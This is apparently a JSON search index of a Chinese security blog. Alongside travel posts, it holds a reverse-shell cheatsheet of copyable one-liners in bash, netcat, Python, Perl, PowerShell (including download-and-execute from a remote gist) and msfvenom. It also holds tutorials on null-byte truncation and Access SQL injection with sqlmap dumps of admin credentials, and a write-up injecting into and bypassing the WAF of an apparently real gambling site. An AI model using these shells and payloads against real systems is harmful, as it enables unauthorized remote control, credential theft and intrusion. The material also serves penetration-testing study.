{"pages":[{"title":"","text":"Oooooops... Oooooops... ERROR 404--NOT FOUND","link":"/404.html"},{"title":"","text":"USER: PASS:","link":"/xsstest.html"},{"title":"About me","text":"当我走向你的时候我原想收获一缕春风你却给了我生命中最美的春天… 1998 处女座 生于北方 Contact | admin[#]se7ensec.cn","link":"/about/index.html"},{"title":"","text":"Reverse shell cheatsheet function disableScrolling(){ var x=window.scrollX; var y=window.scrollY; window.onscroll=function(){window.scrollTo(x, y);}; } function enableScrolling(){ window.onscroll=function(){}; } function copy(item_id) { disableScrolling(); var copyText = document.getElementById(item_id).textContent; const textArea = document.getElementById('txt'); textArea.textContent = copyText; textArea.select(); document.execCommand(\"copy\"); enableScrolling(); return false; } body{ font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji; background-color: #ccc; } button{ padding:0 5px; margin:0; } textarea { position: fixed; left: -100%; } pre{ font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace; font-size:12px; background-color: #f6f8fa; overflow: auto; border: 1px solid #898989; padding: 5px; } .main{ max-width:800px; margin:auto; background-color: #fff; padding:15px; border: 1px solid #898989; } input[type=text]{ border: 1px solid #898989; font-size:22px; width:200px; } IP: Port: function myFunction(){ var ip = document.getElementById(\"ip\").value; var port = document.getElementById(\"port\").value; console.log(ip); console.log(port); var html= document.body.innerHTML; html=html.replace(/127\\.0\\.0\\.1/g,ip); html=html.replace(/8080/g,port); document.body.innerHTML=html; } function myFunction2(){ location.reload(); } Bash TCP: Victim: bash -i >& /dev/tcp/127.0.0.1/8080 0>&1 Copy /bin/bash -i > /dev/tcp/127.0.0.1/8080 0&1 Copy exec 5/dev/tcp/127.0.0.1/8080;cat &5 >&5; done Copy exec /bin/sh 0&lt;/dev/tcp/127.0.0.1/8080 1>&0 2>&0 Copy 0&196 Copy Bash UDP: Victim: sh -i >& /dev/udp/127.0.0.1/8080 0>&1 Copy Listener: nc -u -lvp 8080 Copy Netcat: nc -e /bin/sh 127.0.0.1 8080 Copy nc -e /bin/bash 127.0.0.1 8080 Copy nc -c bash 127.0.0.1 8080 Copy mknod backpipe p && nc 127.0.0.1 8080 0&lt;backpipe | /bin/bash 1>backpipe Copy rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f Copy rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 8080 0/tmp/p 2>&1 Copy rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 > f Copy rm -f x; mknod x p && nc 127.0.0.1 8080 0&lt;x | /bin/bash 1>x Copy Ncat: ncat 127.0.0.1 8080 -e /bin/bash Copy ncat --udp 127.0.0.1 8080 -e /bin/bash Copy Telnet: rm -f /tmp/p; mknod /tmp/p p && telnet 127.0.0.1 8080 0/tmp/p 2>&1 Copy telnet 127.0.0.1 8080 | /bin/bash | telnet 127.0.0.1 444 Copy rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 127.0.0.1 8080 > f Copy rm -f x; mknod x p && telnet 127.0.0.1 8080 0&lt;x | /bin/bash 1>x Copy Socat: Victim: /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080 Copy socat tcp-connect:127.0.0.1:8080 exec:\"bash -li\",pty,stderr,setsid,sigint,sane Copy Listener: socat file:`tty`,raw,echo=0 TCP-L:8080 Copy Victim: wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080 Copy Perl: Victim: perl -e 'use Socket;$i=\"127.0.0.1\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' Copy perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"127.0.0.1:8080\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while;' Copy Windows only, Victim: perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"127.0.0.1:8080\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while;' Copy Python: IP v4 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Copy export RHOST=\"127.0.0.1\";export RPORT=8080;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")' Copy python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' Copy IP v6 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",8080,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/sh\");' Copy Windows only: C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('127.0.0.1', 8080)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\" Copy PHP: php -r '$sock=fsockopen(\"127.0.0.1\",8080);exec(\"/bin/sh -i &3 2>&3\");' Copy php -r '$s=fsockopen(\"127.0.0.1\",8080);$proc=proc_open(\"/bin/sh -i\", array(0=>$s, 1=>$s, 2=>$s),$pipes);' Copy php -r '$s=fsockopen(\"127.0.0.1\",8080);shell_exec(\"/bin/sh -i &3 2>&3\");' Copy php -r '$s=fsockopen(\"127.0.0.1\",8080);`/bin/sh -i &3 2>&3`;' Copy php -r '$s=fsockopen(\"127.0.0.1\",8080);system(\"/bin/sh -i &3 2>&3\");' Copy php -r '$s=fsockopen(\"127.0.0.1\",8080);popen(\"/bin/sh -i &3 2>&3\", \"r\");' Copy Ruby: ruby -rsocket -e'f=TCPSocket.open(\"127.0.0.1\",8080).to_i;exec sprintf(\"/bin/sh -i &%d 2>&%d\",f,f,f)' Copy ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"127.0.0.1\",\"8080\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' Copy NOTE: Windows only ruby -rsocket -e 'c=TCPSocket.new(\"127.0.0.1\",\"8080\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' Copy OpenSSL: Attacker: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes Copy openssl s_server -quiet -key key.pem -cert cert.pem -port 8080 Copy or ncat --ssl -vv -l -p 8080 Copy Victim: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:8080 > /tmp/s; rm /tmp/s Copy Powershell: powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"127.0.0.1\",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Copy powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" Copy powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1') Copy Awk: awk 'BEGIN {s = \"/inet/tcp/0/127.0.0.1/8080\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null Copy TCLsh echo 'set s [socket 127.0.0.1 8080];while 42 { puts -nonewline $s \"shell>\";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh Copy Java: r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5/dev/tcp/127.0.0.1/8080;cat &5 >&5; done\"] as String[]) p.waitFor() Copy String host=\"127.0.0.1\"; int port=4444; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Copy Thread thread = new Thread(){ public void run(){ // Reverse shell here } } thread.start(); Copy War: msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f war > reverse.war strings reverse.war | grep jsp # in order to get the name of the file Copy Lua: Linux only lua -e \"require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','8080');os.execute('/bin/sh -i &3 2>&3');\" Copy Windows and Linux lua5.1 -e 'local host, port = \"127.0.0.1\", 8080 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()' Copy NodeJS: (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(8080, \"127.0.0.1\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); Copy require('child_process').exec('nc -e /bin/sh 127.0.0.1 8080') Copy -var x = global.process.mainModule.require -x('child_process').exec('nc 127.0.0.1 8080 -e /bin/bash') Copy https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py Copy Groovy: String host=\"127.0.0.1\"; int port=8080; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Copy Meterpreter Shell: msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f exe > reverse.exe Copy msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f exe > reverse.exe Copy msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f elf >reverse.elf Copy msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f elf >reverse.elf Copy msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"127.0.0.1\" LPORT=8080 -f elf > shell.elf Copy msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"127.0.0.1\" LPORT=8080 -f exe > shell.exe Copy msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"127.0.0.1\" LPORT=8080 -f macho > shell.macho Copy msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"127.0.0.1\" LPORT=8080 -f asp > shell.asp Copy msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"127.0.0.1\" LPORT=8080 -f raw > shell.jsp Copy msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"127.0.0.1\" LPORT=8080 -f war > shell.war Copy msfvenom -p cmd/unix/reverse_python LHOST=\"127.0.0.1\" LPORT=8080 -f raw > shell.py Copy msfvenom -p cmd/unix/reverse_bash LHOST=\"127.0.0.1\" LPORT=8080 -f raw > shell.sh Copy msfvenom -p cmd/unix/reverse_perl LHOST=\"127.0.0.1\" LPORT=8080 -f raw > shell.pl Copy Xterm: xterm -display 127.0.0.1:1 Xnest :1 xhost +targetip Copy","link":"/ReShell.html"}],"posts":[{"title":"2020年度总结","text":"Hey, password is required here. ff41d9ed7da0c90bb8315e296c2afdc7e5ee23f1c3e49d2449c84df883ef80e7f3e4ffff36be0b9a51ad072802f294a5efd4fd268166a5cba83ce0fce882680f287ddb4c54b0c4532a7ddcad5eb9c573c6bb64efaafb02562e9ffcf45226302583270d87099959f1047ff1e96bca5dcc20730b04074dbcb2d8b59914a1e4c9c91b846fd9f717430b92e13cdafb80c00ff71be92049b6a5daaa647d6718d73a3f7e5b002399fdefc9a95f1dadffa3e6d0a1a87a9874808fc30b81940921753919d2d13a5406f903724686eebacc267aecae97c89c930e0285af89611a98bfa9a06919c19c38732a277d2a82af7f8ebf7df0002a73eb35a23b98dd6c8f029652ea983d737b27941db5af7e908da4b0302c0dd629c497f54fe1c044e0a96b23b5b7eac71f84a727f2d30c2650e1dc565667f9b9567403be2888b952f3055ff1027e9dacf23d039f7da48d659cb2c203e98157eff832ad72a776b0c214398cc54eef7f61a96551d543871d212cc1f440122cd98888accd637dc06fc41490408faf9ad040bc17211a9810acae7cbd051ecd7bb4f0aa7af5bf4a856ce37ecd2cbfcf98e547145a6401b7b625baeff3441fd634f2e378e6b1849c4364a0e45d6370328513b26e925ff39cefebd9d83f67c2e87a126937f0dfa8a7ba59de53e8d32c43947e23fb030e1180f1f388e08c4f6ff6de4b43178ac1b824ed78e80198daa31c39661bc4cd81de544ad0d76ae0e639318c03de4c40437cdd5c2d23b2f080a3ae620939defa4735753420a533d4272ccf0b25df01d9ed25786f93d326b59c66677a68d587082558cb528c3f23789ff82d1808d4ee706b8050a933b569286f7f2ff934c7f64d9b76e59b488afc9b80f964c03c45fb829dab79acc6df6d3b35022d36215712c3a53236ad57f250407a1feddf9faf9982943fc5bf68a422325d62a8287be4cb58fa0b7462c98d29726d3f7597e71a1fae09f79345c44c9015f731e60a1fcdd5df1956608ec11d20879a2e6d09a491f4633d01cb812e0690b9b5b96b27858a7616516322b07b81fff6b09fcc8dd3e8f0aa5f9bddda16dbb1aceb091c39f74845db59a01f7750182a4d76abd915d3faf4af12df3e6370ca09bc3746889fbc892c3fab5f04b36203b16b5ed6bb0b2d84603db09a258fcbb90ee942f1356826105b716a370d10833b8946f97a650224e32156ea545115da0e1512742dca3f571c6ee89cc0b2293b494be1d3e018a3b69cbec7a6ff054252ef2e9abad842dd87010c186d4552738db335f604addcd2f62d0ac602ec30ecd714b044d55d5072c7e648829f208c9d123e3304d5ce512df5a74f61c83f56e1d2952aa235bfdcf0856dbe5e95bf0604f3e2977e2b2a732c12adbf5876ae2e726114a704be47dc7bf2c35a63692126507b7dbe073d75be69adee84b319875ab992bb6bcc002bf417b34cf576445305f7cad949e087be000898b674363ffb247d389177891e4c835440a9969ed29f67222bd9ac1e52d7461f67bd1914bd062944314d7ffed1fac4b1e42506a5fe8a13d068753c8f62836600378f79c4551f653265a23ca8d22275b869427b0811b1496b1e5164ad55d4fe1cbef2919a78212c62104a5a819dc1e0ef7ffd3b5c80ae54bd459a2c0109c2d232afb717c3aab259bf8f06df5beac2c25c02f828fe5244442cd13ac8004011423ff4e941f80a714c91ecb6bf752b61b9f44f69ab52eb11b1e9851a27347a6d37b96e9395f93c4d082378e3c520e13948ad8defe499c5f7c4e8c19d8711fd7e4e73","link":"/2021/01/30/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"},{"title":"00截断之追本溯源","text":"0x00，%00，/00 之类的截断，本质都是一样的，只是不同表现方式而已。 00截断在我写这篇文章之前，一直是很模糊的概念。看到别人利用成功，等到真要使用时又手足无措。用了一些时间学习了一下原理，本文引用比较多，仅仅是为了再次梳理一遍，不作为任何商业用途。 截断原理截断漏洞出现的核心就是chr(0)，这个字符不为空 (Null)，也不是空字符 (“”)，更不是空格。当程序在输出含有 chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。 00截断00截断的限制条件1PHP&lt;5.3.29，magic_quotes_gpc为OFF状态 00截断的利用方法示例代码12345678910111213$uploaded_name = $_FILES[ 'file' ][ 'name' ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); // 提取上传文件后缀$target_name = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // 对上传文件进行重命名if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; )) { move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dir . $target_name); // 将临时文件移动到指定目录 $result = $dir . $target_name; echo &quot;Stored in: $result&quot;; }else{ echo &quot;Invalid file&quot;;} 漏洞原理和利用文件上传需要存在上传路径，比如数据包中存在path: uploads/，那么攻击者可以通过修改path的值来构造paylod: uploads/aa.php%00，如果程序中检测的是文件的后缀名合法性，而且通过拼接路径和文件名来保存上传的文件，那么攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/2018051413370000.php，移动文件的时候会将文件保存为uploads/aaa.php，从而达到Getshell效果。 文件包含假设存在漏洞文件 lfi.php 1234&lt;?php $temp = $_REQUEST['action'].&quot;.php&quot;; include $temp; // include造成了LFI和php的%00截断?&gt; 和想要包含的文件 Password 123&lt;?php phpinfo(); ?&gt; 利用： 1lfi.php?action=password%00 即可成功包含并执行（%00是被会url解码成0x00，所以导致截断） ※也就是说，如果没有截断条件，lfi.php就只能包含php扩展名的文件，有截断条件时，lfi.php可以包含任意文件的扩展名 这时把magic_quotes_gpc打开，%00会被转义成了 \\0 两个单体字符，且不再具有截断功能。原因是：当打开magic_quotes_gpc时，所有的 ‘（单引号），”（双引号），\\（反斜线）和 %00 都会被自动加上一个反斜线进行转义，且还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string() 等。 常见使用误区很多人喜欢在文件名中加%00进行截断，其实方式是不对的，为什么呢？比如攻击者构造文件名：a.php%00a.jpg，在提取后缀名的时候遇到%00则认为字符串结束了，那么他提取到的后缀名最终还是.php，.php后缀又不允许上传所以上传肯定失败了。 %00和%00(urldecode)这是在burp中很常见的两种操作 直接使用%00path可以存放在URL或者Cookie中，而在提交数据的时候，浏览器会对数据做一次urlencode的操作，而到服务端，会对数据进行一次urldecode的操作，因此如果path在 非enctype=multipart/form-data 的表单中或 URL or Cookie 中的时候，就可以直接写%00不需要进行URLdecode操作，让服务端对%00进行自动URL解码即可。 使用%00(urldecode)当上传的表单中有一个enctype的属性，并且需要enctype=&quot;multipart/form-data&quot; (将文件以二进制的形式上传，从而可以实现多种类型的文件上传，且不对表单中数据进行编码)，path大多数都是存放在表单中的，因此需要在数据包中进行urldecode操作使%00变成字符串结束符号。 参考： AdminTony’s Blog 红黑联盟 安恒网络空间安全讲武堂","link":"/2019/02/20/00%E6%88%AA%E6%96%AD%E4%B9%8B%E8%BF%BD%E6%9C%AC%E6%BA%AF%E6%BA%90/"},{"title":"520的天津之行","text":"天津这座城市给我的第一感觉是一个很有活力的城市，而且科技感和现代化十足，文艺气息也很浓厚,真的是一座很有生活感觉的城市。 《马车上的爱情》很幸运遇到一马车结婚的人，哈哈~ 《北洋大学堂》天津大学的前身 《天津之眼》当天是阴天，后来还下起了小雨，还好没有上去… 《海河边的楼》虽然很普通的建筑，但是真的很好看啊 《意租界兵营》院子没上锁，胆子小没敢进去 《解放桥》沧桑历史的见证者，其实对面的拉面不错，嗝~ 《POLICECAR》天津站的特警车，安保神马的都挺到位，趁机偷偷合了影 《天津站》撤退前的最后一张照片了","link":"/2018/05/20/520%E7%9A%84%E5%A4%A9%E6%B4%A5%E4%B9%8B%E8%A1%8C/"},{"title":"北京798艺术中心之行","text":"要么读书，要么旅行。 涂鸦Bus 迷之街角 金属蟹 砖石与金属 铁蒺藜 V字仇杀队 我和她","link":"/2017/05/07/798%E8%89%BA%E6%9C%AF%E4%B8%AD%E5%BF%83%E4%B9%8B%E8%A1%8C/"},{"title":"Access实例注入笔记","text":"前言：最近想把知识点，整理成一些文章，一点原因是对自己知识的沉淀做到温故而知新，另一点对于能帮助到别人解决疑惑也感到很开心。 下面开始重要内容：Access注入形成的原理本文不在详细赘述，否则篇幅会过长，更多的是记录方法（本文后续会永久保持更新）。 Asp环境：小旋风 靶机地址：192.168.19.138 网站源码：雷驰新闻系统v 1.0 Access数据库结构： Access数据库是以单文件，mdb格式，以表的形式存在，所以数据库也就是只有一个文件，它的结构如下图： 0x01-1 Access手工注入-逐字猜解法注入点：http://192.168.19.138/leichinews/onews.asp?id=40 1.猜解数据表我们在id后面构造语句and exists(select * from user)，意思是查询Access表中的user表，如果这个user表存在，页面就会返回正常，如果不存在，则就会报错，至于是不是user，就要靠我们来进行暴力猜解了 1http://192.168.19.138/leichinews/onews.asp?id=40 and exists(select* from user) [页面报错，说明数据库中不存在user表] 1http://192.168.19.138/leichinews/onews.asp?id=40 and exists(select* from admin) [成功执行，页面没有变化，说明数据库中存在admin表] 2.猜解数据列现在我们已经确定了该数据库中存在admin表，接下来当然是要猜解admin表中的列，在id参数后构造语句 and exists (select admin from admin)，这条语句的意思是：查询admin表中的admin列，如果存在则返回正常，不存在则返回错误页面，现在我们进行构造： 1http://192.168.19.138/leichinews/onews.asp?id=40 and exists(select admin from admin) 我们发现返回正常，说明admin表中存在admin列，我们再继续猜解，看还有哪些列，因为一般情况下，有一个账号列，就必然有一个密码列，因此现在继续猜解列，在id后构造内容and exists (select password from admin)，这条语句的大意为：查询admin表下的password列，如果存在就返回正常，如果不存在则页面报错: 如上，可以得出结论，admin表中存在password列，接下来我们猜解admin列和password列的长度是多少，因此只有确认了字段的长度，才能更加准确的来猜解数据的内容 3.猜解数据列的长度使用语句and (select top 1 len (admin) from admin)&gt;4，这条语句的意思是，如果admin表中admin列的长度大于4，则返回正常，如果小于4，则页面报错，现在进行猜解 当我们输入4的时候返回正常，输入5的时候返回错误，因此我们判定，admin列的长度为5，password列长度也和上一步操作一样，只需将admin列改为password列即可。 4.猜解数据列的内容接下来猜解admin列和password列的内容，在id后构造语句and (select top 1 asc (mid(admin,1,1)) from admin)&gt;96,这条语句的意思是，如果admin列中第一个字符的ASCII码如果大于97则返回正常，如果小于97则返回错误。 可以看到，当我们输入97的时候，显示错误，96返回正常，说明第一个字符的ASCII码为97，对照下方ASCII表，可以得出，admin列中第一个字符为a [构造and (select top 1 asc(mid(admin,2,1)) from admin)=97 则为判断第二位] password列和上述方法一样，通过构造语句，and (select top 1 asc (mid(password,1,1)) from admin)&gt;XX,其中X代表ASCII，根据页面的返回信息，可以很容易的判断出来字符的ASCII码，在通过上述表进行对照，即可得到账号密码，本文因篇幅有限，不再赘述重复的操作 通过一一的对比，我们成功的得出了账号密码。 0x01-2 Access手工注入-联合查询法1.查询数据列数目1order by xx 可知列数目为11 2.猜解数据表12http://192.168.19.138/leichinews/onews.asp?id=40 UNION SELECT1,2,3,4,5,6,7,8,9,10,11 from admin 查询access数据库中有没有admin表，存在返回正常，不存在返回错误 3.猜解数据列和列内容12http://192.168.19.138/leichinews/onews.asp?id=40 UNION SELECT1,admin,password,4,5,6,7,8,9,10,11 from admin 查询access数据库中admin表下面有没有username,password列内容；如果有则列出内容，没有显示报错 如图可以成功得出，admin和password列中的内容 0X02-1 Access工具注入-常规注入使用工具：SQLmap 1.猜解数据表1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp?id=40 --dbs --tables –dbs表示将数据库显示出来，–tables是将表名显示出来 2.猜解数据列1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp?id=40 -T admin --columns 其中， -T代表当前要猜解的表名， –columns 代表猜解列，等待一段时间可以得到admin表中的列名 3.猜解数据列内容1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp?id=40 -T admin -C &quot;admin,password&quot; --dump -C 代表指定要猜解的列名，指定猜解admin和password列中的内容 0x02-2 Access工具注入-中转注入(cookie注入)通过SQLmap，提交cookie数据，注入中转，成功绕过通用型防注入，通用型防注入只是过滤了POST参数，但是没有过滤cookie参数，因此我们使用SQLmap提交cookie数据，就成功的绕过了。 1.猜解数据表1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs --tables 其中 -u 代表要测试的URL，–cookie表示使用cookie的方式提交， –level 表示测试的等级, –dbs表示将数据库显示出来，–tables是将表名显示出来 程序员没有考虑到恶意用户会通过cookie来提交参数，因此没有调用防注入程序来过滤cookie部分，从而导致cookie注入的发生。 这条SQLmap命令，level值至少为2 时SQLmap才会测试cookie，我们输入这条命令，按下回车，这时耐心等待一段时间，SQLmap会自动将表名猜解出来 2.猜解数据列我们可以看到它已经猜解出了admin表和new表，根据经验判断，我们对admin表进行下一步猜解，使用命令 1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs -T admin --columns 其中， -T代表 当前要猜解的表名， –columns 代表猜解列，等待一段时间可以得到admin表中的列名 3.猜解数据列内容账号密码一般都存储在admin和password列中，因此我们着重猜解这两列，使用命令 1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs -T admin -C &quot;admin,password&quot; --dump 其中，–dump的意思是 将数据内容脱到本地，执行上述命令后可以成功得到账号密码","link":"/2018/09/12/Access%E5%AE%9E%E4%BE%8B%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"},{"title":"BC实战|Bypass安全狗","text":"学以致用。 漏洞发现常规流程走一遍，发现一处标记信息已读的功能点比较可疑： 抓包加单引号重放： 可以看到单引号被转义了，看下闭合方式，问题不大，因为有回显，直接使用报错注入。 报错注入获取下数据库用户1127) or updatexml(1,concat(0x3a,user()),1 获取数据库1127) or updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 0,1),1 Bypass安全狗掏出前段时间学到的打狗棒法（超长字符Bypass，这里类型不同，原理相同）：传送门 后面的和常规报错没什么不同，就不啰嗦了，领会精神~ 小Tips渗透测试中习惯以开发者的角度考虑一个功能的实现，会更快的找到有效的切入点。 结合BurpSuite的Intruder模块中的Grep-Match 功能使用，可以快速提取报错注入的结果。 